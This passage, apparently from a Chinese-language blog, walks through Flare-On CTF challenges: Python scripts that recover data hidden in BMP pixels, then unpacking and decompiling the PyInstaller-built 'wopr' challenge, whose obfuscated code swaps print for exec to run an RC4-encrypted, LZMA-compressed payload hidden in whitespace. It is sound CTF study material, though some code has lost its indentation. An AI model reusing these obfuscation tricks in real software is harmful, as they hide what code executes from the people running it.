class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;flag.bmp&#x27;</span>)</span><br><span class="line"><span class="comment"># img2 = Image.open(&#x27;new1.jpg&#x27;)</span></span><br><span class="line">pixel = img.load()</span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">p = pixel[x, y]</span><br><span class="line">        <span class="comment"># print(p)</span></span><br><span class="line">data = (p[<span class="number">0</span>]&amp;<span class="number">7</span>) | ((p[<span class="number">1</span>]&amp;<span class="number">7</span>)&lt;&lt;<span class="number">3</span>) | ((p[<span class="number">2</span>]&amp;<span class="number">3</span>)&lt;&lt;<span class="number">6</span>)</span><br><span class="line">d.append(data)</span><br><span class="line"></span><br><span class="line">extract_file = <span class="string">&quot;&quot;</span>.join(map(chr,d))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;extract_file&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(extract_file)</span><br></pre></td></tr></table></figure><p>通过分析代码逻辑发现其中h的逻辑大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># c((a((data[i] ^ f(num++)) , 7))) ^ f(num++),3)</span></span><br><span class="line"><span class="meta"># f =&gt; g  a =&gt; b  c =&gt; d</span></span><br></pre></td></tr></table></figure><p>但其中几个函数被替换，f 替换为 g, a替换为b, c替换为d</p><p>最后代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extractFile</span>():</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    img = Image.open(<span class="string">&#x27;flag.bmp&#x27;</span>)</span><br><span class="line">    <span class="comment"># img2 = Image.open(&#x27;new1.jpg&#x27;)</span></span><br><span class="line">    pixel = img.load()</span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">            p = pixel[x, y]</span><br><span class="line">            <span class="comment"># print(p)</span></span><br><span class="line">            data = (p[<span class="number">0</span>]&amp;<span class="number">7</span>) | ((p[<span class="number">1</span>]&amp;<span class="number">7</span>)&lt;&lt;<span class="number">3</span>) | ((p[<span class="number">2</span>]&amp;<span class="number">3</span>)&lt;&lt;<span class="number">6</span>)</span><br><span class="line">            d.append(data)</span><br><span class="line"></span><br><span class="line">    extract_file = <span class="string">&quot;&quot;</span>.join(map(chr,d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;extract_file&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(extract_file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">idx</span>):</span></span><br><span class="line">    b = ((<span class="number">0xc5</span>*(idx+<span class="number">1</span>))^ (<span class="number">0x7d</span>*(idx+<span class="number">2</span>)))&amp;<span class="number">0xff</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">byte,len</span>):</span> <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len):</span><br><span class="line">        b2 = ((byte &amp; <span class="number">128</span>) / <span class="number">128</span>) &amp;<span class="number">0xff</span></span><br><span class="line">        b = ((byte * <span class="number">2</span> &amp; <span class="number">0xff</span>) + b2) &amp; <span class="number">0xff</span>    </span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span>(<span class="params">byte,len</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len):</span><br><span class="line">        b2 = ((byte &amp; <span class="number">1</span>) * <span class="number">128</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        b = ((byte / <span class="number">2</span> &amp; <span class="number">0xff</span>) + b2) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">return</span> a^b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> (a&gt;&gt;i&amp;<span class="number">1</span>) == (b&gt;&gt;i&amp;<span class="number">1</span>):</span><br><span class="line">a = a &amp; ~(<span class="number">1</span>&lt;&lt;i)&amp;<span class="number">255</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">a = a | (<span class="number">1</span>&lt;&lt;i)&amp;<span class="number">255</span></span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># def f(idx):</span></span><br><span class="line"><span class="comment"># n = 1</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment"># yield ((n*309030853)^((n+1)*209897853))&amp;0xff</span></span><br><span class="line"><span class="comment"># n += 1</span></span><br><span class="line"><span class="comment"># b = ((idx+1)*309030853)&amp;0xff</span></span><br><span class="line"><span class="comment"># k = ((idx+2)*209897853)&amp;0xff</span></span><br><span class="line"><span class="comment"># return b ^ k</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift_left</span> (<span class="params">int_value,k,bit = <span class="number">8</span></span>):</span> </span><br><span class="line">    bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit</span><br><span class="line">    bin_value = bit_string.format(int_value) <span class="comment"># 8 bit binary</span></span><br><span class="line">    bin_value = bin_value[k:] + bin_value[:k]</span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># right circular shift</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift_right</span> (<span class="params">int_value,k,bit = <span class="number">8</span></span>):</span> </span><br><span class="line">    bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit </span><br><span class="line">    bin_value = bit_string.format(int_value) <span class="comment"># 8 bit binary </span></span><br><span class="line">    bin_value = bin_value[-k:] + bin_value[:-k] </span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"><span class="comment"># c((a((data[i] ^ f(num++)) , 7))) ^ f(num++),3)</span></span><br><span class="line"><span class="comment"># f =&gt; g  a =&gt; b  c =&gt; d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    data = open(<span class="string">&quot;extract_file&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="comment"># data = data[::-1]</span></span><br><span class="line"></span><br><span class="line">    data2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    data3 = <span class="string">&quot;&quot;</span></span><br><span class="line">    data4 = <span class="string">&quot;&quot;</span></span><br><span class="line">    data5 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(data)):</span><br><span class="line">        data2 += chr(circular_shift_left(ord(data[i]),<span class="number">3</span>))</span><br><span class="line">        data3 += chr(ord(data2[i]) ^ g(<span class="number">2</span>*i+<span class="number">1</span>) ) </span><br><span class="line">        data4 += chr(circular_shift_right(ord(data3[i]),<span class="number">7</span>))</span><br><span class="line">        data5 += chr(ord(data4[i]) ^ g(<span class="number">2</span>*i))</span><br><span class="line"></span><br><span class="line">    save = open(<span class="string">&quot;flag.bmp&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    save.write(data5)</span><br><span class="line"></span><br><span class="line">decode()</span><br></pre></td></tr></table></figure><h2 id="7-wopr"><a href="#7-wopr" class="headerlink" title="7 - wopr"></a>7 - wopr</h2><p>一个 PE 文件，IDA打开分析发现是 pyintaller 打包的，使用 <a href="https://github.com/countercept/python-exe-unpacker">pyinstxtractor</a> 进行解包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py wopr.exe</span><br></pre></td></tr></table></figure><p>得到一堆解包后的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># swing @ localhost in ~&#x2F;Desktop&#x2F;flare-on&#x2F;7 - wopr&#x2F;wopr.exe_extracted [14:15:19]</span><br><span class="line">$ ls</span><br><span class="line">PYZ-00.pyz                                      api-ms-win-crt-convert-l1-1-0.dll</span><br><span class="line">PYZ-00.pyz_extracted                            api-ms-win-crt-environment-l1-1-0.dll</span><br><span class="line">VCRUNTIME140.dll                                api-ms-win-crt-filesystem-l1-1-0.dll</span><br><span class="line">_bz2.pyd                                        api-ms-win-crt-heap-l1-1-0.dll</span><br><span class="line">_ctypes.pyd                                     api-ms-win-crt-locale-l1-1-0.dll</span><br><span class="line">_hashlib.pyd                                    api-ms-win-crt-math-l1-1-0.dll</span><br><span class="line">_lzma.pyd                                       api-ms-win-crt-process-l1-1-0.dll</span><br><span class="line">_socket.pyd                                     api-ms-win-crt-runtime-l1-1-0.dll</span><br><span class="line">_ssl.pyd                                        api-ms-win-crt-stdio-l1-1-0.dll</span><br><span class="line">api-ms-win-core-console-l1-1-0.dll              api-ms-win-crt-string-l1-1-0.dll</span><br><span class="line">api-ms-win-core-datetime-l1-1-0.dll             api-ms-win-crt-time-l1-1-0.dll</span><br><span class="line">api-ms-win-core-debug-l1-1-0.dll                api-ms-win-crt-utility-l1-1-0.dll</span><br><span class="line">api-ms-win-core-errorhandling-l1-1-0.dll        base_library</span><br><span class="line">api-ms-win-core-file-l1-1-0.dll                 base_library.zip</span><br><span class="line">api-ms-win-core-file-l1-2-0.dll                 libcrypto-1_1.dll</span><br><span class="line">api-ms-win-core-file-l2-1-0.dll                 libssl-1_1.dll</span><br><span class="line">api-ms-win-core-handle-l1-1-0.dll               pyexpat.pyd</span><br><span class="line">api-ms-win-core-heap-l1-1-0.dll                 pyi-windows-manifest-filename wopr.exe.manifest</span><br><span class="line">api-ms-win-core-interlocked-l1-1-0.dll          pyiboot01_bootstrap</span><br><span class="line">api-ms-win-core-libraryloader-l1-1-0.dll        pyiboot01_bootstrap_dis</span><br><span class="line">api-ms-win-core-localization-l1-2-0.dll         pyiboot02_cleanup.py</span><br><span class="line">api-ms-win-core-memory-l1-1-0.dll               pyiboot02_cleanup.pyc</span><br><span class="line">api-ms-win-core-namedpipe-l1-1-0.dll            pyiboot02_cleanup_dis</span><br><span class="line">api-ms-win-core-processenvironment-l1-1-0.dll   pyimod01_os_path</span><br><span class="line">api-ms-win-core-processthreads-l1-1-0.dll       pyimod02_archive</span><br><span class="line">api-ms-win-core-processthreads-l1-1-1.dll       pyimod03_importers</span><br><span class="line">api-ms-win-core-profile-l1-1-0.dll              python37.dll</span><br><span class="line">api-ms-win-core-rtlsupport-l1-1-0.dll           select.pyd</span><br><span class="line">api-ms-win-core-string-l1-1-0.dll               struct</span><br><span class="line">api-ms-win-core-synch-l1-1-0.dll                this key</span><br><span class="line">api-ms-win-core-synch-l1-2-0.dll                this\__init__.py</span><br><span class="line">api-ms-win-core-sysinfo-l1-1-0.dll              this\key</span><br><span class="line">api-ms-win-core-timezone-l1-1-0.dll             ucrtbase.dll</span><br><span class="line">api-ms-win-core-util-l1-1-0.dll                 unicodedata.pyd</span><br><span class="line">api-ms-win-crt-conio-l1-1-0.dll                 wopr.exe.manifest</span><br></pre></td></tr></table></figure><p>由于题目提示是要找启动代码，所以找到了pyi** 开头的几个文件 由于几个文件缺少了pyc头，我们将pyc头给补上（python3.7版本）然后使用 <strong>python-uncompyle6</strong> 进行反编译，其中 pyiboot-2_cleanup代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, io, lzma, pkgutil, random, struct, sys, time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">print(<span class="string">&#x27;LOADING...&#x27;</span>)</span><br><span class="line">BOUNCE = pkgutil.get_data(<span class="string">&#x27;this&#x27;</span>, <span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ho</span>(<span class="params">h, g=&#123;&#125;</span>):</span></span><br><span class="line">    k = bytes.fromhex(format(h, <span class="string">&#x27;x&#x27;</span>)).decode()</span><br><span class="line">    <span class="keyword">return</span> g.get(k, k)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="number">1702389091</span></span><br><span class="line">b = <span class="number">482955849332</span></span><br><span class="line">g = ho(<span class="number">29516388843672123817340395359</span>, globals())</span><br><span class="line">aa = getattr(g, ho(a))</span><br><span class="line">bb = getattr(g, ho(b))</span><br><span class="line">a ^= b</span><br><span class="line">b ^= a</span><br><span class="line">a ^= b</span><br><span class="line">setattr(g, ho(a), aa)</span><br><span class="line">setattr(g, ho(b), bb)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eye</span>(<span class="params">face</span>):</span></span><br><span class="line">    leg = io.BytesIO()</span><br><span class="line">    <span class="keyword">for</span> arm <span class="keyword">in</span> face.splitlines():</span><br><span class="line">        print(arm)</span><br><span class="line">        arm = arm[len(arm.rstrip(<span class="string">&#x27; \t&#x27;</span>)):]</span><br><span class="line">        leg.write(arm)</span><br><span class="line"></span><br><span class="line">    face = leg.getvalue()</span><br><span class="line">    bell = io.BytesIO()</span><br><span class="line">    x, y = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> chuck <span class="keyword">in</span> face:</span><br><span class="line">        taxi = &#123;<span class="number">9</span>:<span class="number">0</span>, </span><br><span class="line">         <span class="number">32</span>:<span class="number">1</span>&#125;.get(chuck)</span><br><span class="line">        <span class="keyword">if</span> taxi <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        x, y = x | taxi &lt;&lt; y, y + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; <span class="number">7</span>:</span><br><span class="line">            bell.write(bytes([x]))</span><br><span class="line">            x, y = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> bell.getvalue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fire</span>(<span class="params">wood, bounce</span>):</span></span><br><span class="line">    meaning = bytearray(wood)</span><br><span class="line">    bounce = bytearray(bounce)</span><br><span class="line">    regard = len(bounce)</span><br><span class="line">    manage = list(range(<span class="number">256</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prospect</span>(<span class="params">*financial</span>):</span></span><br><span class="line">        <span class="keyword">return</span> sum(financial) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blade</span>(<span class="params">feel, cassette</span>):</span></span><br><span class="line">        cassette = prospect(cassette, manage[feel])</span><br><span class="line">        manage[feel], manage[cassette] = manage[cassette], manage[feel]</span><br><span class="line">        <span class="keyword">return</span> cassette</span><br><span class="line"></span><br><span class="line">    cassette = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> feel <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        cassette = prospect(cassette, bounce[(feel % regard)])</span><br><span class="line">        cassette = blade(feel, cassette)</span><br><span class="line"></span><br><span class="line">    cassette = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pigeon, _ <span class="keyword">in</span> enumerate(meaning):</span><br><span class="line">        feel = prospect(pigeon, <span class="number">1</span>)</span><br><span class="line">        cassette = blade(feel, cassette)</span><br><span class="line">        meaning[pigeon] ^= manage[prospect(manage[feel], manage[cassette])]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes(meaning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(lzma.decompress(fire(eye(__doc__.encode()), bytes([i]) + BOUNCE)))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>他会取<code>__doc__</code> 里的制表符和空格进行编码，然后rc4解密，然后解压缩，但是 python-uncompyle6 这个反编译后的代码没有了 制表符，后面我又搜了个工具叫 pycdc 重新反编译，得到了一部分新代码。</p><p>但是后面发现没有输出，最后发现前面有一段代码将print 替换成了exec</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">GREETINGS = [<span class="string">&quot;HI&quot;</span>, <span class="string">&quot;HELLO&quot;</span>, <span class="string">&quot;&#x27;SUP&quot;</span>, <span class="string">&quot;AHOY&quot;</span>, <span class="string">&quot;ALOHA&quot;</span>, <span class="string">&quot;HOWDY&quot;</span>, <span class="string">&quot;GREETINGS&quot;</span>, <span class="string">&quot;ZDRAVSTVUYTE&quot;</span>]</span><br><span class="line">STRATEGIES = [<span class="string">&#x27;U.S. FIRST STRIKE&#x27;</span>, <span class="string">&#x27;USSR FIRST STRIKE&#x27;</span>, <span class="string">&#x27;NATO / WARSAW PACT&#x27;</span>, <span class="string">&#x27;FAR EAST STRATEGY&#x27;</span>, <span class="string">&#x27;US USSR ESCALATION&#x27;</span>, <span class="string">&#x27;MIDDLE EAST WAR&#x27;</span>, <span class="string">&#x27;USSR CHINA ATTACK&#x27;</span>, <span class="string">&#x27;INDIA PAKISTAN WAR&#x27;</span>, <span class="string">&#x27;MEDITERRANEAN WAR&#x27;</span>, <span class="string">&#x27;HONGKONG VARIANT&#x27;</span>, <span class="string">&#x27;SEATO DECAPITATING&#x27;</span>, <span class="string">&#x27;CUBAN PROVOCATION&#x27;</span>, <span class="string">&#x27;ATLANTIC HEAVY&#x27;</span>, <span class="string">&#x27;CUBAN PARAMILITARY&#x27;</span>, <span class="string">&#x27;NICARAGUAN PREEMPTIVE&#x27;</span>, <span class="string">&#x27;PACIFIC TERRITORIAL&#x27;</span>, <span class="string">&#x27;BURMESE THEATERWIDE&#x27;</span>, <span class="string">&#x27;TURKISH DECOY&#x27;</span>, <span class="string">&#x27;ARGENTINA ESCALATION&#x27;</span>, <span class="string">&#x27;ICELAND MAXIMUM&#x27;</span>, <span class="string">&#x27;ARABIAN THEATERWIDE&#x27;</span>, <span class="string">&#x27;U.S. SUBVERSION&#x27;</span>, <span class="string">&#x27;AUSTRALIAN MANEUVER&#x27;</span>, <span class="string">&#x27;SUDAN SURPRISE&#x27;</span>, <span class="string">&#x27;NATO TERRITORIAL&#x27;</span>, <span class="string">&#x27;ZAIRE ALLIANCE&#x27;</span>, <span class="string">&#x27;ICELAND INCIDENT&#x27;</span>, <span class="string">&#x27;ENGLISH ESCALATION&#x27;</span>, <span class="string">&#x27;MIDDLE EAST HEAVY&#x27;</span>, <span class="string">&#x27;MEXICAN TAKEOVER&#x27;</span>, <span class="string">&#x27;CHAD ALERT&#x27;</span>, <span class="string">&#x27;SAUDI MANEUVER&#x27;</span>, <span class="string">&#x27;AFRICAN TERRITORIAL&#x27;</span>, <span class="string">&#x27;ETHIOPIAN ESCALATION&#x27;</span>, <span class="string">&#x27;TURKISH HEAVY&#x27;</span>, <span class="string">&#x27;NATO INCURSION&#x27;</span>, <span class="string">&#x27;U.S. DEFENSE&#x27;</span>, <span class="string">&#x27;CAMBODIAN HEAVY&#x27;</span>, <span class="string">&#x27;PACT MEDIUM&#x27;</span>, <span class="string">&#x27;ARCTIC MINIMAL&#x27;</span>, <span class="string">&#x27;MEXICAN DOMESTIC&#x27;</span>, <span class="string">&#x27;TAIWAN THEATERWIDE&#x27;</span>, <span class="string">&#x27;PACIFIC MANEUVER&#x27;</span>, <span class="string">&#x27;PORTUGAL 